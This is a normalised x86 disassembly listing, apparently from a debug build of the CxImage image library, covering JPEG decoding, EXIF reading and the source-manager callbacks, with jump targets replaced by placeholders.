call ?SetPalette@CxImage@@QAEXPAUtagRGBQUAD@@K@Z
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x14c ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x150 ]
mov [ ebp - 0x80 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0x16 ]
mov [ ebp - 0x234 ] edx
mov eax [ ebp - 0x234 ]
sub eax 0x1
mov [ ebp - 0x234 ] eax
cmp [ ebp - 0x234 ] 0x17
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x10 ]
call ?AlphaIsValid@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
mov edx [ ebp - 0x234 ]
xor ecx ecx
mov cl [ edx + lookup_table_414dd4 ]
jmp [ ecx * 4 + jump_table_414dc8 ]
cmp [ ebp + 0x18 ] 0x0
je r-xdata
lea ecx [ ebp - 0x1d0 ]
call ?AlphaCreate@CxImage@@QAEXXZ
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x1f4 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x1a0 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
imul eax [ edx + 0xc ]
add ecx eax
mov [ ebp - 0x1f8 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x1fc ] ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x1d8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1ba ]
and ecx 0xffff
mov edx [ ebp - 0x1c4 ]
imul edx ecx
sar edx 0x3
mov [ ebp - 0x1e4 ] edx
mov eax [ ebp - 0x19c ]
mov [ ebp - 0x1e8 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x1c ]
imul edx [ ecx + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x34 ]
add ecx edx
mov edx [ ebp - 0x10 ]
xor eax eax
mov ax [ edx + 0x16 ]
mov edx [ ebp - 0x14 ]
imul edx eax
sar edx 0x3
add ecx edx
mov [ ebp - 0x1ec ] ecx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x1f0 ] eax
jmp r-xdata
lea edx [ ebp - 0x1d0 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
lea ecx [ ebp - 0x1d0 ]
push ecx
mov ecx [ ebp + 0x18 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
jmp r-xdata
mov eax [ ebp - 0x1fc ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x1d4 ]
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov edx [ ebp - 0x1f0 ]
cmp edx [ ebp - 0x20 ]
jge r-xdata
mov [ ebp - 0x200 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1d0 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x200 ]
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp - 0x1f8 ]
push edx
mov eax [ ebp - 0x1f4 ]
push eax
call memcpy
add esp 0xc
mov ecx [ ebp - 0x1f4 ]
add ecx [ ebp - 0x1c4 ]
mov [ ebp - 0x1f4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1f8 ]
add eax [ edx + 0xc ]
mov [ ebp - 0x1f8 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
imul eax eax 0x64
cdq
idiv [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x144 ] eax
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1dc ] edx
mov [ ebp - 0x1e0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1f0 ]
imul eax eax 0x64
cdq
idiv [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x144 ] eax
mov edx [ ebp - 0x1e4 ]
push edx
mov eax [ ebp - 0x1ec ]
push eax
mov ecx [ ebp - 0x1e8 ]
push ecx
call memcpy
add esp 0xc
mov edx [ ebp - 0x1e8 ]
add edx [ ebp - 0x1a0 ]
mov [ ebp - 0x1e8 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1ec ]
add ecx [ eax + 0x30 ]
mov [ ebp - 0x1ec ] ecx
jmp r-xdata
mov edx [ ebp - 0x1fc ]
add edx 0x1
mov [ ebp - 0x1fc ] edx
mov edx [ ebp - 0x1dc ]
cmp edx [ ebp - 0x18 ]
jge r-xdata
mov ecx [ ebp - 0x1f0 ]
add ecx 0x1
mov [ ebp - 0x1f0 ] ecx
jmp r-xdata
mov eax [ ebp - 0x1d4 ]
push eax
mov ecx [ ebp - 0x1dc ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
mov edx [ ebp - 0x1d8 ]
push edx
mov eax [ ebp - 0x1e0 ]
push eax
lea ecx [ ebp - 0x1d0 ]
call ?SetPixelIndex@CxImage@@QAEXJJE@Z
jmp r-xdata
mov ecx [ ebp - 0x1d4 ]
add ecx 0x1
mov [ ebp - 0x1d4 ] ecx
mov edx [ ebp - 0x1d8 ]
add edx 0x1
mov [ ebp - 0x1d8 ] edx
mov eax [ ebp - 0x1dc ]
add eax 0x1
mov [ ebp - 0x1dc ] eax
mov ecx [ ebp - 0x1e0 ]
add ecx 0x1
mov [ ebp - 0x1e0 ] ecx
??0CxImageJPG@@QAE@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push 0x3
mov ecx [ ebp - 0x4 ]
call ??0CxImage@@QAE@K@Z
mov eax [ ebp - 0x4 ]
mov [ eax ] CxImageJPG::`vbtable'
push 0x4b8
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x1a8
push ecx
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?DecodeExif@CxImageJPG@@QAE_NPAVCxFile@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434d6c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x250
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x25c ]
mov ecx 0x94
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov esi esp
mov ecx [ ebp + 0x8 ]
call [ edx + 0x14 ]
cmp esi esp
call _chkesp
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x1a8
push eax
lea ecx [ ebp - 0x218 ]
call sub_4176f0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x218 ]
call sub_417870
mov esi esp
push 0x0
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call [ edx + 0x10 ]
cmp esi esp
call _chkesp
mov eax [ ebp - 0x218 ]
mov cl [ eax + 0x4b4 ]
mov [ ebp - 0x21c ] cl
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x218 ]
call sub_4177c0
mov al [ ebp - 0x21c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x25c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
?Decode@CxImageJPG@@QAE_NPAVCxFile@@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434d8c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34c
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x358 ]
mov ecx 0xd3
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?DecodeExif@CxImageJPG@@QAE_NPAVCxFile@@@Z
mov [ ebp - 0x14 ] al
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_40fc00
mov edx [ ebp - 0x10 ]
add edx 0x44
mov [ ebp - 0x1e0 ] edx
lea eax [ ebp - 0x2a4 ]
push eax
call sub_41aaf0
add esp 0x4
mov [ ebp - 0x1dc ] eax
mov [ ebp - 0x2a4 ] sub_415d80
lea ecx [ ebp - 0x220 ]
push r--data
mov edx [ ebp - 0x4 ]
push edx
push __CxxLongjmpUnwind
push 0x3
push ecx
call _setjmp3
add esp 0x14
test eax eax
je r-xdata
push 0x1b0
push 0x3e
lea ecx [ ebp - 0x1dc ]
push ecx
call sub_419400
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x2e8 ]
call sub_4156c0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2e8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x1dc ]
push eax
call sub_419580
add esp 0x4
xor al al
jmp r-xdata
mov [ ebp - 0x310 ] 0x0
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x310 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x100
test eax eax
je r-xdata
mov [ ebp - 0x1b0 ] 0x1
mov edx [ ebp - 0x310 ]
mov [ ebp - 0x1c4 ] edx
push 0x1
lea eax [ ebp - 0x1dc ]
push eax
call sub_4195a0
add esp 0x8
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x80
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x200
test eax eax
je r-xdata
mov [ ebp - 0x192 ] 0x1
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx + 0x154 ]
mov [ ebp - 0x188 ] edx
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x400
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x670 ]
mov [ ebp - 0x190 ] ecx
mov ecx [ ebp - 0x10 ]
call ?GetCodecOption@CxImage@@QBEKXZ
and eax 0x800
test eax eax
je r-xdata
mov [ ebp - 0x18c ] 0x0
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx + 0x155 ]
mov [ ebp - 0x1a8 ] eax
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x148 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x194 ] 0x0
lea edx [ ebp - 0x1dc ]
push edx
call sub_419b90
add esp 0x4
push 0x3
mov eax [ ebp - 0x174 ]
shl eax 0x3
push eax
mov ecx [ ebp - 0x17c ]
push ecx
mov edx [ ebp - 0x180 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x1dc ]
push edx
call sub_419f20
add esp 0x4
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x180 ]
mov [ eax + 0xc ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x17c ]
mov [ edx + 0x10 ] eax
lea ecx [ ebp - 0x1dc ]
push ecx
call sub_419580
add esp 0x4
mov [ ebp - 0x308 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2e8 ]
call sub_415780
mov al [ ebp - 0x308 ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
and edx 0xff
test edx edx
je r-xdata
mov esi esp
push 0x1
lea ecx [ ebp - 0x220 ]
push ecx
call [ longjmp@IAT ]
cmp esi esp
call _chkesp
mov edx [ ebp - 0xd9 ]
and edx 0xff
cmp edx 0x2
jne r-xdata
mov eax [ ebp - 0x10 ]
fld [ eax + 0x25c ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
jne r-xdata
mov edx [ ebp - 0xd8 ]
and edx 0xffff
push edx
mov ecx [ ebp - 0x10 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
mov eax [ ebp - 0xd6 ]
and eax 0xffff
push eax
mov ecx [ ebp - 0x10 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
mov eax [ ebp - 0xd8 ]
and eax 0xffff
mov [ ebp - 0x314 ] eax
fild [ ebp - 0x314 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
push eax
mov ecx [ ebp - 0x10 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
mov ecx [ ebp - 0xd6 ]
and ecx 0xffff
mov [ ebp - 0x318 ] ecx
fild [ ebp - 0x318 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
push eax
mov ecx [ ebp - 0x10 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
jmp r-xdata
mov ecx [ ebp - 0x10 ]
fld [ ecx + 0x260 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
jne r-xdata
mov ecx [ ebp - 0x10 ]
fld [ ecx + 0x264 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
jne r-xdata
mov edx [ ebp - 0x192 ]
and edx 0xff
cmp edx 0x1
jne r-xdata
mov ecx [ ebp - 0x10 ]
call ?SetGrayPalette@CxImage@@QAEXXZ
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x28 ] 0x100
jmp r-xdata
cmp [ ebp - 0x1b0 ] 0x1
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
fld [ edx + 0x264 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x40
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
fld [ edx + 0x25c ]
fdiv [ eax + 0x264 ]
call _ftol
push eax
mov ecx [ ebp - 0x10 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
mov eax [ ebp - 0x10 ]
mov [ eax + 0x28 ] 0x0
mov eax [ ebp - 0x168 ]
mov ecx [ eax + 0x8 ]
push ecx
mov edx [ ebp - 0x168 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x168 ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x16c ]
push eax
mov ecx [ ebp - 0x10 ]
call ?SetPalette@CxImage@@QAEXKPAE00@Z
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x16c ]
mov [ ecx + 0x28 ] edx
jmp r-xdata
mov ecx [ ebp - 0x180 ]
imul ecx [ ebp - 0x174 ]
mov [ ebp - 0x2ac ] ecx
mov esi esp
push 0x1
mov edx [ ebp - 0x2ac ]
push edx
push 0x1
lea eax [ ebp - 0x1dc ]
push eax
mov ecx [ ebp - 0x1d8 ]
call [ ecx + 0x8 ]
add esp 0x10
cmp esi esp
call _chkesp
mov [ ebp - 0x2a8 ] eax
lea ecx [ ebp - 0x2c ]
call sub_415bc0
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
fld [ eax + 0x260 ]
fdiv [ ecx + 0x264 ]
call _ftol
push eax
mov ecx [ ebp - 0x10 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
lea eax [ ebp - 0x1dc ]
push eax
call sub_419a70
add esp 0x4
cmp [ ebp - 0x1b8 ] 0x3
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
lea eax [ ebp - 0x1dc ]
push eax
call sub_419580
add esp 0x4
mov [ ebp - 0x30c ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2e8 ]
call sub_415780
mov al [ ebp - 0x30c ]
mov ecx [ ebp - 0x192 ]
and ecx 0xff
test ecx ecx
jne r-xdata
push 0x1
mov edx [ ebp - 0x2a8 ]
push edx
lea eax [ ebp - 0x1dc ]
push eax
call sub_419e30
add esp 0xc
cmp [ ebp - 0x1b8 ] 0x4
jne r-xdata
mov esi esp
push 0x1
lea ecx [ ebp - 0x220 ]
push ecx
call [ longjmp@IAT ]
cmp esi esp
call _chkesp
push 0x0
mov ecx [ ebp - 0x10 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov [ ebp - 0x300 ] eax
mov [ ebp - 0x304 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov ecx [ ebp - 0x2a8 ]
mov edx [ ecx ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_415cb0
mov ecx [ ebp - 0x192 ]
and ecx 0xff
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x304 ]
cmp ecx [ eax + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x164 ]
cmp edx [ ebp - 0x17c ]
jae r-xdata
lea ecx [ ebp - 0x2c ]
call ?GetHeight@CxImage@@QBEKXZ
mov [ ebp - 0x2f0 ] eax
mov edx [ ebp - 0x2a8 ]
mov eax [ edx ]
mov [ ebp - 0x2f4 ] eax
mov [ ebp - 0x2f8 ] 0x0
mov [ ebp - 0x2fc ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x148 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x2f8 ]
cmp ecx [ eax + 0x30 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
imul edx edx 0x3
push edx
mov eax [ ebp - 0x300 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?RGBtoBGR@CxImage@@IAEXPAEH@Z
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x300 ]
add edx [ ecx + 0x30 ]
mov [ ebp - 0x300 ] edx
jmp r-xdata
mov esi esp
push 0x1
lea eax [ ebp - 0x220 ]
push eax
call [ longjmp@IAT ]
cmp esi esp
call _chkesp
jmp r-xdata
mov edx [ ebp - 0x2fc ]
cmp edx [ ebp - 0x2ac ]
jge r-xdata
mov edx [ ebp - 0x304 ]
add edx 0x1
mov [ ebp - 0x304 ] edx
lea ecx [ ebp - 0x2c ]
call sub_415c40
jmp r-xdata
mov eax [ ebp - 0x2f4 ]
add eax [ ebp - 0x2fc ]
mov cl [ eax + 0x3 ]
mov [ ebp - 0x2ec ] cl
mov eax [ ebp - 0x2ec ]
and eax 0xff
mov edx [ ebp - 0x2f4 ]
add edx [ ebp - 0x2fc ]
xor ecx ecx
mov cl [ edx + 0x2 ]
imul eax ecx
cdq
mov ecx 0xff
idiv ecx
mov edx [ ebp - 0x2f0 ]
add edx [ ebp - 0x2f8 ]
mov [ edx ] al
mov eax [ ebp - 0x2ec ]
and eax 0xff
mov ecx [ ebp - 0x2f4 ]
add ecx [ ebp - 0x2fc ]
xor edx edx
mov dl [ ecx + 0x1 ]
imul eax edx
cdq
mov ecx 0xff
idiv ecx
mov edx [ ebp - 0x2f0 ]
add edx [ ebp - 0x2f8 ]
mov [ edx + 0x1 ] al
mov eax [ ebp - 0x2ec ]
and eax 0xff
mov ecx [ ebp - 0x2f4 ]
add ecx [ ebp - 0x2fc ]
xor edx edx
mov dl [ ecx ]
imul eax edx
cdq
mov ecx 0xff
idiv ecx
mov edx [ ebp - 0x2f0 ]
add edx [ ebp - 0x2f8 ]
mov [ edx + 0x2 ] al
jmp r-xdata
mov ecx [ ebp - 0x2f8 ]
add ecx 0x3
mov [ ebp - 0x2f8 ] ecx
mov edx [ ebp - 0x2fc ]
add edx 0x4
mov [ ebp - 0x2fc ] edx
sub_4156c0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x30 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] sub_4157d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_415810
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] sub_4158b0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] sub_4159a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] sub_4159f0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x24 ] sub_415b00
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] sub_41ae10
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] sub_415ba0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] 0x0
push 0x1000
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_415780
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
sub_4157d0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x1000
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415810
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov esi esp
push 0x1000
push 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp esi esp
call _chkesp
cmp eax 0x1000
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x1000
mov al 0x1
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x25
mov esi esp
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp esi esp
call _chkesp
sub_4158b0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax 0x1000
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ edx ]
mov esi esp
call [ eax + 0x1c ]
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov edx [ eax ]
mov esi esp
call [ edx + 0x24 ]
cmp esi esp
call _chkesp
test eax eax
je r-xdata
mov esi esp
mov ecx [ ebp - 0x8 ]
push ecx
push 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x30 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp esi esp
call _chkesp
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x25
mov esi esp
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp esi esp
call _chkesp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x25
mov esi esp
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp esi esp
call _chkesp
sub_4159a0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx 0x14
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x38 ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4159f0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
lea edi [ ebp - 0x4c ]
mov ecx 0x13
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
sub edx 0x14
mov [ ebp - 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x34 ]
mov [ ecx + 0x14 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x38 ] 0x0
mov al 0x1
pop edi
pop esi
pop ebx
add esp 0x4c
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov cl [ eax + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov esi esp
push 0x1000
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x8 ]
cmp esi esp
call _chkesp
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x78
mov esi esp
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
cmp esi esp
call _chkesp
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x34 ]
mov [ ecx ] 0xff
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x34 ]
mov [ eax + 0x1 ] 0xd9
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x2a
mov esi esp
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp esi esp
call _chkesp
sub_415b00
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
mov eax [ ebp + 0x8 ]
